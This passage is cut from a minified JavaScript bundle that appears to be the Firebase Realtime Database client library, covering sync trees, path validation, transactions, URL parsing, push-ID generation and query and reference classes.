c=n?n.getImmediateChild(a):null,d=uv(r,a),p=t.operationForChild(a);p&&(o=o.concat(Cv(p,l,c,d)))}),s&&(o=o.concat(rp(s,t,r,n))),o}function jv(t,e){const n=e.query,r=ro(t,n);return{hashFn:()=>(MC(e)||J.EMPTY_NODE).hash(),onComplete:s=>{if(s==="ok")return r?ZC(t,n._path,r):JC(t,n._path);{const o=Jw(s,n);return qa(t,n,null,o)}}}}function ro(t,e){const n=Sl(e);return t.queryToTagMap.get(n)}function Sl(t){return t._path.toString()+"$"+t._queryIdentifier}function ip(t,e){return t.tagToQueryMap.get(e)}function op(t){const e=t.indexOf("$");return $(e!==-1&&e<t.length-1,"Bad queryKey."),{queryId:t.substr(e+1),path:new he(t.substr(0,e))}}function ap(t,e,n){const r=t.syncPointTree_.get(e);$(r,"Missing sync point for query tag that we're tracking");const s=_l(t.pendingWriteTree_,e);return rp(r,n,s,null)}function nj(t){return t.fold((e,n,r)=>{if(n&&ur(n))return[wl(n)];{let s=[];return n&&(s=vv(n)),nt(r,(o,a)=>{s=s.concat(a)}),s}})}function Ii(t){return t._queryParams.loadsAllData()&&!t._queryParams.isDefault()?new(KC())(t._repo,t._path):t}function rj(t,e){for(let n=0;n<e.length;++n){const r=e[n];if(!r._queryParams.loadsAllData()){const s=Sl(r),o=t.queryToTagMap.get(s);t.queryToTagMap.delete(s),t.tagToQueryMap.delete(o)}}}function sj(){return QC++}function ij(t,e,n){const r=e._path,s=ro(t,e),o=jv(t,n),a=t.listenProvider_.startListening(Ii(e),s,o.hashFn,o.onComplete),l=t.syncPointTree_.subtree(r);if(s)$(!ur(l.value),"If we're adding a query, it shouldn't be shadowed");else{const c=l.fold((d,p,f)=>{if(!ie(d)&&p&&ur(p))return[wl(p).query];{let u=[];return p&&(u=u.concat(vv(p).map(b=>b.query))),nt(f,(b,x)=>{u=u.concat(x)}),u}});for(let d=0;d<c.length;++d){const p=c[d];t.listenProvider_.stopListening(Ii(p),ro(t,p))}}return a}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class lp{constructor(e){this.node_=e}getImmediateChild(e){const n=this.node_.getImmediateChild(e);return new lp(n)}node(){return this.node_}}class cp{constructor(e,n){this.syncTree_=e,this.path_=n}getImmediateChild(e){const n=Te(this.path_,e);return new cp(this.syncTree_,n)}node(){return sp(this.syncTree_,this.path_)}}const oj=function(t){return t=t||{},t.timestamp=t.timestamp||new Date().getTime(),t},jh=function(t,e,n){if(!t||typeof t!="object")return t;if($(".sv"in t,"Unexpected leaf node or priority contents"),typeof t[".sv"]=="string")return aj(t[".sv"],e,n);if(typeof t[".sv"]=="object")return lj(t[".sv"],e);$(!1,"Unexpected server value: "+JSON.stringify(t,null,2))},aj=function(t,e,n){switch(t){case"timestamp":return n.timestamp;default:$(!1,"Unexpected server value: "+t)}},lj=function(t,e,n){t.hasOwnProperty("increment")||$(!1,"Unexpected server value: "+JSON.stringify(t,null,2));const r=t.increment;typeof r!="number"&&$(!1,"Unexpected increment value: "+r);const s=e.node();if($(s!==null&&typeof s<"u","Expected ChildrenNode.EMPTY_NODE for nulls"),!s.isLeafNode())return r;const a=s.getValue();return typeof a!="number"?r:a+r},kv=function(t,e,n,r){return dp(e,new cp(n,t),r)},Nv=function(t,e,n){return dp(t,new lp(e),n)};function dp(t,e,n){const r=t.getPriority().val(),s=jh(r,e.getImmediateChild(".priority"),n);let o;if(t.isLeafNode()){const a=t,l=jh(a.getValue(),e,n);return l!==a.getValue()||s!==a.getPriority().val()?new Ge(l,Be(s)):t}else{const a=t;return o=a,s!==a.getPriority().val()&&(o=o.updatePriority(new Ge(s))),a.forEachChild(Ae,(l,c)=>{const d=dp(c,e.getImmediateChild(l),n);d!==c&&(o=o.updateImmediateChild(l,d))}),o}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class up{constructor(e="",n=null,r={children:{},childCount:0}){this.name=e,this.parent=n,this.node=r}}function pp(t,e){let n=e instanceof he?e:new he(e),r=t,s=re(n);for(;s!==null;){const o=Es(r.node.children,s)||{children:{},childCount:0};r=new up(s,r,o),n=ve(n),s=re(n)}return r}function Us(t){return t.node.value}function Ev(t,e){t.node.value=e,Ad(t)}function Iv(t){return t.node.childCount>0}function cj(t){return Us(t)===void 0&&!Iv(t)}function Cl(t,e){nt(t.node.children,(n,r)=>{e(new up(n,t,r))})}function Rv(t,e,n,r){n&&e(t),Cl(t,s=>{Rv(s,e,!0)})}function dj(t,e,n){let r=t.parent;for(;r!==null;){if(e(r))return!0;r=r.parent}return!1}function bo(t){return new he(t.parent===null?t.name:bo(t.parent)+"/"+t.name)}function Ad(t){t.parent!==null&&uj(t.parent,t.name,t)}function uj(t,e,n){const r=cj(n),s=gn(t.node.children,e);r&&s?(delete t.node.children[e],t.node.childCount--,Ad(t)):!r&&!s&&(t.node.children[e]=n.node,t.node.childCount++,Ad(t))}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const pj=/[\[\].#$\/\u0000-\u001F\u007F]/,fj=/[\[\].#$\u0000-\u001F\u007F]/,xc=10*1024*1024,fp=function(t){return typeof t=="string"&&t.length!==0&&!pj.test(t)},Tv=function(t){return typeof t=="string"&&t.length!==0&&!fj.test(t)},hj=function(t){return t&&(t=t.replace(/^\/*\.info(\/|$)/,"/")),Tv(t)},mj=function(t){return t===null||typeof t=="string"||typeof t=="number"&&!Wu(t)||t&&typeof t=="object"&&gn(t,".sv")},Av=function(t,e,n,r){r&&e===void 0||jl(xl(t,"value"),e,n)},jl=function(t,e,n){const r=n instanceof he?new AS(n,t):n;if(e===void 0)throw new Error(t+"contains undefined "+Cr(r));if(typeof e=="function")throw new Error(t+"contains a function "+Cr(r)+" with contents = "+e.toString());if(Wu(e))throw new Error(t+"contains "+e.toString()+" "+Cr(r));if(typeof e=="string"&&e.length>xc/3&&vl(e)>xc)throw new Error(t+"contains a string greater than "+xc+" utf8 bytes "+Cr(r)+" ('"+e.substring(0,50)+"...')");if(e&&typeof e=="object"){let s=!1,o=!1;if(nt(e,(a,l)=>{if(a===".value")s=!0;else if(a!==".priority"&&a!==".sv"&&(o=!0,!fp(a)))throw new Error(t+" contains an invalid key ("+a+") "+Cr(r)+`.  Keys must be non-empty strings and can't contain ".", "#", "$", "/", "[", or "]"`);PS(r,a),jl(t,l,r),DS(r)}),s&&o)throw new Error(t+' contains ".value" child '+Cr(r)+" in addition to actual children.")}},gj=function(t,e){let n,r;for(n=0;n<e.length;n++){r=e[n];const o=Ji(r);for(let a=0;a<o.length;a++)if(!(o[a]===".priority"&&a===o.length-1)){if(!fp(o[a]))throw new Error(t+"contains an invalid key ("+o[a]+") in path "+r.toString()+`. Keys must be non-empty strings and can't contain ".", "#", "$", "/", "[", or "]"`)}}e.sort(TS);let s=null;for(n=0;n<e.length;n++){if(r=e[n],s!==null&&Bt(s,r))throw new Error(t+"contains a path "+s.toString()+" that is ancestor of another path "+r.toString());s=r}},xj=function(t,e,n,r){const s=xl(t,"values");if(!(e&&typeof e=="object")||Array.isArray(e))throw new Error(s+" must be an object containing the children to replace.");const o=[];nt(e,(a,l)=>{const c=new he(a);if(jl(s,l,Te(n,c)),Vu(c)===".priority"&&!mj(l))throw new Error(s+"contains an invalid value for '"+c.toString()+"', which must be a valid Firebase priority (a string, finite number, server value, or null).");o.push(c)}),gj(s,o)},Pv=function(t,e,n,r){if(!Tv(n))throw new Error(xl(t,e)+'was an invalid path = "'+n+`". Paths must be non-empty strings and can't contain ".", "#", "$", "[", or "]"`)},vj=function(t,e,n,r){n&&(n=n.replace(/^\/*\.info(\/|$)/,"/")),Pv(t,e,n)},hp=function(t,e){if(re(e)===".info")throw new Error(t+" failed = Can't modify data under /.info/")},yj=function(t,e){const n=e.path.toString();if(typeof e.repoInfo.host!="string"||e.repoInfo.host.length===0||!fp(e.repoInfo.namespace)&&e.repoInfo.host.split(":")[0]!=="localhost"||n.length!==0&&!hj(n))throw new Error(xl(t,"url")+`must be a valid firebase URL and the path can't contain ".", "#", "$", "[", or "]".`)};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class bj{constructor(){this.eventLists_=[],this.recursionDepth_=0}}function kl(t,e){let n=null;for(let r=0;r<e.length;r++){const s=e[r],o=s.getPath();n!==null&&!Gu(o,n.path)&&(t.eventLists_.push(n),n=null),n===null&&(n={events:[],path:o}),n.events.push(s)}n&&t.eventLists_.push(n)}function Dv(t,e,n){kl(t,n),Lv(t,r=>Gu(r,e))}function Gt(t,e,n){kl(t,n),Lv(t,r=>Bt(r,e)||Bt(e,r))}function Lv(t,e){t.recursionDepth_++;let n=!0;for(let r=0;r<t.eventLists_.length;r++){const s=t.eventLists_[r];if(s){const o=s.path;e(o)?(_j(t.eventLists_[r]),t.eventLists_[r]=null):n=!1}}n&&(t.eventLists_=[]),t.recursionDepth_--}function _j(t){for(let e=0;e<t.events.length;e++){const n=t.events[e];if(n!==null){t.events[e]=null;const r=n.getEventRunner();ji&&Ze("event: "+n.toString()),$s(r)}}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const wj="repo_interrupt",Sj=25;class Cj{constructor(e,n,r,s){this.repoInfo_=e,this.forceRestClient_=n,this.authTokenProvider_=r,this.appCheckProvider_=s,this.dataUpdateCount=0,this.statsListener_=null,this.eventQueue_=new bj,this.nextWriteId_=1,this.interceptServerDataCallback_=null,this.onDisconnect_=Ba(),this.transactionQueueTree_=new up,this.persistentConnection_=null,this.key=this.repoInfo_.toURLString()}toString(){return(this.repoInfo_.secure?"https://":"http://")+this.repoInfo_.host}}function jj(t,e,n){if(t.stats_=Uu(t.repoInfo_),t.forceRestClient_||nS())t.server_=new $a(t.repoInfo_,(r,s,o,a)=>{kh(t,r,s,o,a)},t.authTokenProvider_,t.appCheckProvider_),setTimeout(()=>Nh(t,!0),0);else{if(typeof n<"u"&&n!==null){if(typeof n!="object")throw new Error("Only objects are supported for option databaseAuthVariableOverride");try{Ue(n)}catch(r){throw new Error("Invalid authOverride provided: "+r)}}t.persistentConnection_=new In(t.repoInfo_,e,(r,s,o,a)=>{kh(t,r,s,o,a)},r=>{Nh(t,r)},r=>{kj(t,r)},t.authTokenProvider_,t.appCheckProvider_,n),t.server_=t.persistentConnection_}t.authTokenProvider_.addTokenChangeListener(r=>{t.server_.refreshAuthToken(r)}),t.appCheckProvider_.addTokenChangeListener(r=>{t.server_.refreshAppCheckToken(r.token)}),t.statsReporter_=aS(t.repoInfo_,()=>new oC(t.stats_,t.server_)),t.infoData_=new tC,t.infoSyncTree_=new Ch({startListening:(r,s,o,a)=>{let l=[];const c=t.infoData_.getNode(r._path);return c.isEmpty()||(l=yo(t.infoSyncTree_,r._path,c),setTimeout(()=>{a("ok")},0)),l},stopListening:()=>{}}),mp(t,"connected",!1),t.serverSyncTree_=new Ch({startListening:(r,s,o,a)=>(t.server_.listen(r,o,s,(l,c)=>{const d=a(l,c);Gt(t.eventQueue_,r._path,d)}),[]),stopListening:(r,s)=>{t.server_.unlisten(r,s)}})}function zv(t){const n=t.infoData_.getNode(new he(".info/serverTimeOffset")).val()||0;return new Date().getTime()+n}function Nl(t){return oj({timestamp:zv(t)})}function kh(t,e,n,r,s){t.dataUpdateCount++;const o=new he(e);n=t.interceptServerDataCallback_?t.interceptServerDataCallback_(e,n):n;let a=[];if(s)if(r){const c=La(n,d=>Be(d));a=ej(t.serverSyncTree_,o,c,s)}else{const c=Be(n);a=wv(t.serverSyncTree_,o,c,s)}else if(r){const c=La(n,d=>Be(d));a=XC(t.serverSyncTree_,o,c)}else{const c=Be(n);a=yo(t.serverSyncTree_,o,c)}let l=o;a.length>0&&(l=Ps(t,o)),Gt(t.eventQueue_,l,a)}function Nh(t,e){mp(t,"connected",e),e===!1&&Rj(t)}function kj(t,e){nt(e,(n,r)=>{mp(t,n,r)})}function mp(t,e,n){const r=new he("/.info/"+e),s=Be(n);t.infoData_.updateSnapshot(r,s);const o=yo(t.infoSyncTree_,r,s);Gt(t.eventQueue_,r,o)}function gp(t){return t.nextWriteId_++}function Nj(t,e,n){const r=tj(t.serverSyncTree_,e);return r!=null?Promise.resolve(r):t.server_.get(e).then(s=>{const o=Be(s).withIndex(e._queryParams.getIndex());Td(t.serverSyncTree_,e,n,!0);let a;if(e._queryParams.loadsAllData())a=yo(t.serverSyncTree_,e._path,o);else{const l=ro(t.serverSyncTree_,e);a=wv(t.serverSyncTree_,e._path,o,l)}return Gt(t.eventQueue_,e._path,a),qa(t.serverSyncTree_,e,n,null,!0),o},s=>(_o(t,"get for query "+Ue(e)+" failed: "+s),Promise.reject(new Error(s))))}function Ej(t,e,n,r,s){_o(t,"set",{path:e.toString(),value:n,priority:r});const o=Nl(t),a=Be(n,r),l=sp(t.serverSyncTree_,e),c=Nv(a,l,o),d=gp(t),p=_v(t.serverSyncTree_,e,c,d,!0);kl(t.eventQueue_,p),t.server_.put(e.toString(),a.val(!0),(u,b)=>{const x=u==="ok";x||ft("set at "+e+" failed: "+u);const v=Kn(t.serverSyncTree_,d,!x);Gt(t.eventQueue_,e,v),Pd(t,s,u,b)});const f=vp(t,e);Ps(t,f),Gt(t.eventQueue_,f,[])}function Ij(t,e,n,r){_o(t,"update",{path:e.toString(),value:n});let s=!0;const o=Nl(t),a={};if(nt(n,(l,c)=>{s=!1,a[l]=kv(Te(e,l),Be(c),t.serverSyncTree_,o)}),s)Ze("update() called with empty data.  Don't do anything."),Pd(t,r,"ok",void 0);else{const l=gp(t),c=qC(t.serverSyncTree_,e,a,l);kl(t.eventQueue_,c),t.server_.merge(e.toString(),n,(d,p)=>{const f=d==="ok";f||ft("update at "+e+" failed: "+d);const u=Kn(t.serverSyncTree_,l,!f),b=u.length>0?Ps(t,e):e;Gt(t.eventQueue_,b,u),Pd(t,r,d,p)}),nt(n,d=>{const p=vp(t,Te(e,d));Ps(t,p)}),Gt(t.eventQueue_,e,[])}}function Rj(t){_o(t,"onDisconnectEvents");const e=Nl(t),n=Ba();jd(t.onDisconnect_,ue(),(s,o)=>{const a=kv(s,o,t.serverSyncTree_,e);ov(n,s,a)});let r=[];jd(n,ue(),(s,o)=>{r=r.concat(yo(t.serverSyncTree_,s,o));const a=vp(t,s);Ps(t,a)}),t.onDisconnect_=Ba(),Gt(t.eventQueue_,ue(),r)}function Tj(t,e,n){let r;re(e._path)===".info"?r=Td(t.infoSyncTree_,e,n):r=Td(t.serverSyncTree_,e,n),Dv(t.eventQueue_,e._path,r)}function Eh(t,e,n){let r;re(e._path)===".info"?r=qa(t.infoSyncTree_,e,n):r=qa(t.serverSyncTree_,e,n),Dv(t.eventQueue_,e._path,r)}function Aj(t){t.persistentConnection_&&t.persistentConnection_.interrupt(wj)}function _o(t,...e){let n="";t.persistentConnection_&&(n=t.persistentConnection_.id+":"),Ze(n,...e)}function Pd(t,e,n,r){e&&$s(()=>{if(n==="ok")e(null);else{const s=(n||"error").toUpperCase();let o=s;r&&(o+=": "+r);const a=new Error(o);a.code=s,e(a)}})}function Mv(t,e,n){return sp(t.serverSyncTree_,e,n)||J.EMPTY_NODE}function xp(t,e=t.transactionQueueTree_){if(e||El(t,e),Us(e)){const n=Fv(t,e);$(n.length>0,"Sending zero length transaction queue"),n.every(s=>s.status===0)&&Pj(t,bo(e),n)}else Iv(e)&&Cl(e,n=>{xp(t,n)})}function Pj(t,e,n){const r=n.map(d=>d.currentWriteId),s=Mv(t,e,r);let o=s;const a=s.hash();for(let d=0;d<n.length;d++){const p=n[d];$(p.status===0,"tryToSendTransactionQueue_: items in queue should all be run."),p.status=1,p.retryCount++;const f=ut(e,p.path);o=o.updateChild(f,p.currentOutputSnapshotRaw)}const l=o.val(!0),c=e;t.server_.put(c.toString(),l,d=>{_o(t,"transaction put response",{path:c.toString(),status:d});let p=[];if(d==="ok"){const f=[];for(let u=0;u<n.length;u++)n[u].status=2,p=p.concat(Kn(t.serverSyncTree_,n[u].currentWriteId)),n[u].onComplete&&f.push(()=>n[u].onComplete(null,!0,n[u].currentOutputSnapshotResolved)),n[u].unwatcher();El(t,pp(t.transactionQueueTree_,e)),xp(t,t.transactionQueueTree_),Gt(t.eventQueue_,e,p);for(let u=0;u<f.length;u++)$s(f[u])}else{if(d==="datastale")for(let f=0;f<n.length;f++)n[f].status===3?n[f].status=4:n[f].status=0;else{ft("transaction at "+c.toString()+" failed: "+d);for(let f=0;f<n.length;f++)n[f].status=4,n[f].abortReason=d}Ps(t,e)}},a)}function Ps(t,e){const n=Ov(t,e),r=bo(n),s=Fv(t,n);return Dj(t,s,r),r}function Dj(t,e,n){if(e.length===0)return;const r=[];let s=[];const a=e.filter(l=>l.status===0).map(l=>l.currentWriteId);for(let l=0;l<e.length;l++){const c=e[l],d=ut(n,c.path);let p=!1,f;if($(d!==null,"rerunTransactionsUnderNode_: relativePath should not be null."),c.status===4)p=!0,f=c.abortReason,s=s.concat(Kn(t.serverSyncTree_,c.currentWriteId,!0));else if(c.status===0)if(c.retryCount>=Sj)p=!0,f="maxretry",s=s.concat(Kn(t.serverSyncTree_,c.currentWriteId,!0));else{const u=Mv(t,c.path,a);c.currentInputSnapshot=u;const b=e[l].update(u.val());if(b!==void 0){jl("transaction failed: Data returned ",b,c.path);let x=Be(b);typeof b=="object"&&b!=null&&gn(b,".priority")||(x=x.updatePriority(u.getPriority()));const _=c.currentWriteId,m=Nl(t),h=Nv(x,u,m);c.currentOutputSnapshotRaw=x,c.currentOutputSnapshotResolved=h,c.currentWriteId=gp(t),a.splice(a.indexOf(_),1),s=s.concat(_v(t.serverSyncTree_,c.path,h,c.currentWriteId,c.applyLocally)),s=s.concat(Kn(t.serverSyncTree_,_,!0))}else p=!0,f="nodata",s=s.concat(Kn(t.serverSyncTree_,c.currentWriteId,!0))}Gt(t.eventQueue_,n,s),s=[],p&&(e[l].status=2,function(u){setTimeout(u,Math.floor(0))}(e[l].unwatcher),e[l].onComplete&&(f==="nodata"?r.push(()=>e[l].onComplete(null,!1,e[l].currentInputSnapshot)):r.push(()=>e[l].onComplete(new Error(f),!1,null))))}El(t,t.transactionQueueTree_);for(let l=0;l<r.length;l++)$s(r[l]);xp(t,t.transactionQueueTree_)}function Ov(t,e){let n,r=t.transactionQueueTree_;for(n=re(e);n!==null&&Us(r)===void 0;)r=pp(r,n),e=ve(e),n=re(e);return r}function Fv(t,e){const n=[];return Wv(t,e,n),n.sort((r,s)=>r.order-s.order),n}function Wv(t,e,n){const r=Us(e);if(r)for(let s=0;s<r.length;s++)n.push(r[s]);Cl(e,s=>{Wv(t,s,n)})}function El(t,e){const n=Us(e);if(n){let r=0;for(let s=0;s<n.length;s++)n[s].status!==2&&(n[r]=n[s],r++);n.length=r,Ev(e,n.length>0?n:void 0)}Cl(e,r=>{El(t,r)})}function vp(t,e){const n=bo(Ov(t,e)),r=pp(t.transactionQueueTree_,e);return dj(r,s=>{vc(t,s)}),vc(t,r),Rv(r,s=>{vc(t,s)}),n}function vc(t,e){const n=Us(e);if(n){const r=[];let s=[],o=-1;for(let a=0;a<n.length;a++)n[a].status===3||(n[a].status===1?($(o===a-1,"All SENT items should be at beginning of queue."),o=a,n[a].status=3,n[a].abortReason="set"):($(n[a].status===0,"Unexpected transaction status in abort"),n[a].unwatcher(),s=s.concat(Kn(t.serverSyncTree_,n[a].currentWriteId,!0)),n[a].onComplete&&r.push(n[a].onComplete.bind(null,new Error("set"),!1,null))));o===-1?Ev(e,void 0):n.length=o+1,Gt(t.eventQueue_,bo(e),s);for(let a=0;a<r.length;a++)$s(r[a])}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Lj(t){let e="";const n=t.split("/");for(let r=0;r<n.length;r++)if(n[r].length>0){let s=n[r];try{s=decodeURIComponent(s.replace(/\+/g," "))}catch{}e+="/"+s}return e}function zj(t){const e={};t.charAt(0)==="?"&&(t=t.substring(1));for(const n of t.split("&")){if(n.length===0)continue;const r=n.split("=");r.length===2?e[decodeURIComponent(r[0])]=decodeURIComponent(r[1]):ft(`Invalid query segment '${n}' in query '${t}'`)}return e}const Ih=function(t,e){const n=Mj(t),r=n.namespace;n.domain==="firebase.com"&&zn(n.host+" is no longer supported. Please use <YOUR FIREBASE>.firebaseio.com instead"),(!r||r==="undefined")&&n.domain!=="localhost"&&zn("Cannot parse Firebase url. Please use https://<YOUR FIREBASE>.firebaseio.com"),n.secure||Yw();const s=n.scheme==="ws"||n.scheme==="wss";return{repoInfo:new Ux(n.host,n.secure,r,s,e,"",r!==n.subdomain),path:new he(n.pathString)}},Mj=function(t){let e="",n="",r="",s="",o="",a=!0,l="https",c=443;if(typeof t=="string"){let d=t.indexOf("//");d>=0&&(l=t.substring(0,d-1),t=t.substring(d+2));let p=t.indexOf("/");p===-1&&(p=t.length);let f=t.indexOf("?");f===-1&&(f=t.length),e=t.substring(0,Math.min(p,f)),p<f&&(s=Lj(t.substring(p,f)));const u=zj(t.substring(Math.min(t.length,f)));d=e.indexOf(":"),d>=0?(a=l==="https"||l==="wss",c=parseInt(e.substring(d+1),10)):d=e.length;const b=e.slice(0,d);if(b.toLowerCase()==="localhost")n="localhost";else if(b.split(".").length<=2)n=b;else{const x=e.indexOf(".");r=e.substring(0,x).toLowerCase(),n=e.substring(x+1),o=r}"ns"in u&&(o=u.ns)}return{host:e,port:c,domain:n,subdomain:r,secure:a,scheme:l,pathString:s,namespace:o}};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Rh="-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz",Oj=function(){let t=0;const e=[];return function(n){const r=n===t;t=n;let s;const o=new Array(8);for(s=7;s>=0;s--)o[s]=Rh.charAt(n%64),n=Math.floor(n/64);$(n===0,"Cannot push at time == 0");let a=o.join("");if(r){for(s=11;s>=0&&e[s]===63;s--)e[s]=0;e[s]++}else for(s=0;s<12;s++)e[s]=Math.floor(Math.random()*64);for(s=0;s<12;s++)a+=Rh.charAt(e[s]);return $(a.length===20,"nextPushId: Length should be 20."),a}}();/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Fj{constructor(e,n,r,s){this.eventType=e,this.eventRegistration=n,this.snapshot=r,this.prevName=s}getPath(){const e=this.snapshot.ref;return this.eventType==="value"?e._path:e.parent._path}getEventType(){return this.eventType}getEventRunner(){return this.eventRegistration.getEventRunner(this)}toString(){return this.getPath().toString()+":"+this.eventType+":"+Ue(this.snapshot.exportVal())}}class Wj{constructor(e,n,r){this.eventRegistration=e,this.error=n,this.path=r}getPath(){return this.path}getEventType(){return"cancel"}getEventRunner(){return this.eventRegistration.getEventRunner(this)}toString(){return this.path.toString()+":cancel"}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class $v{constructor(e,n){this.snapshotCallback=e,this.cancelCallback=n}onValue(e,n){this.snapshotCallback.call(null,e,n)}onCancel(e){return $(this.hasCancelCallback,"Raising a cancel event on a listener with no cancel callback"),this.cancelCallback.call(null,e)}get hasCancelCallback(){return!!this.cancelCallback}matches(e){return this.snapshotCallback===e.snapshotCallback||this.snapshotCallback.userCallback!==void 0&&this.snapshotCallback.userCallback===e.snapshotCallback.userCallback&&this.snapshotCallback.context===e.snapshotCallback.context}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class yp{constructor(e,n,r,s){this._repo=e,this._path=n,this._queryParams=r,this._orderByCalled=s}get key(){return ie(this._path)?null:Vu(this._path)}get ref(){return new Fn(this._repo,this._path)}get _queryIdentifier(){const e=hh(this._queryParams),n=$u(e);return n==="{}"?"default":n}get _queryObject(){return hh(this._queryParams)}isEqual(e){if(e=$r(e),!(e instanceof yp))return!1;const n=this._repo===e._repo,r=Gu(this._path,e._path),s=this._queryIdentifier===e._queryIdentifier;return n&&r&&s}toJSON(){return this.toString()}toString(){return this._repo.toString()+RS(this._path)}}class Fn extends yp{constructor(e,n){super(e,n,new qu,!1)}get parent(){const e=Jx(this._path);return e===null?null:new Fn(this._repo,e)}get root(){let e=this;for(;e.parent!==null;)e=e.parent;return e}}class so{constructor(e,n,r){this._node=e,this.ref=n,this._index=r}get priority(){return this._node.getPriority().val()}get key(){return this.ref.key}get size(){return this._node.numChildren()}child(e){const n=new he(e),r=io(this.ref,e);return new so(this._node.getChild(n),r,Ae)}exists(){return!this._node.isEmpty()}exportVal(){return this._node.val(!0)}forEach(e){return this._node.isLeafNode()?!1:!!this._node.forEachChild(this._index,(r,s)=>e(new so(s,io(this.ref,r),Ae)))}hasChild(e){const n=new he(e);return!this._node.getChild(n).isEmpty()}hasChildren(){return this._node.isLeafNode()?!1:!this._node.isEmpty()}toJSON(){return this.exportVal()}val(){return this._node.val()}}function B(t,e){return t=$r(t),t._checkNotDeleted("ref"),e!==void 0?io(t._root,e):t._root}function io(t,e){return t=$r(t),re(t._path)===null?vj("child","path",e):Pv("child","path",e),new Fn(t._repo,Te(t._path,e))}function Bv(t,e){t=$r(t),hp("push",t._path),Av("push",e,t._path,!0);const n=zv(t._repo),r=Oj(n),s=io(t,r),o=io(t,r);let a;return e!=null?a=bt(o,e).then(()=>o):a=Promise.resolve(o),s.then=a.then.bind(a),s.catch=a.then.bind(a,void 0),s}function Rt(t){return hp("remove",t._path),bt(t,null)}function bt(t,e){t=$r(t),hp("set",t._path),Av("set",e,t._path,!1);const n=new ho;return Ej(t._repo,t._path,e,null,n.wrapCallback(()=>{})),n.promise}function kt(t,e){xj("update",e,t._path);const n=new ho;return Ij(t._repo,t._path,e,n.wrapCallback(()=>{})),n.promise}function ce(t){t=$r(t);const e=new $v(()=>{}),n=new Il(e);return Nj(t._repo,t,n).then(r=>new so(r,new Fn(t._repo,t._path),t._queryParams.getIndex()))}class Il{constructor(e){this.callbackContext=e}respondsTo(e){return 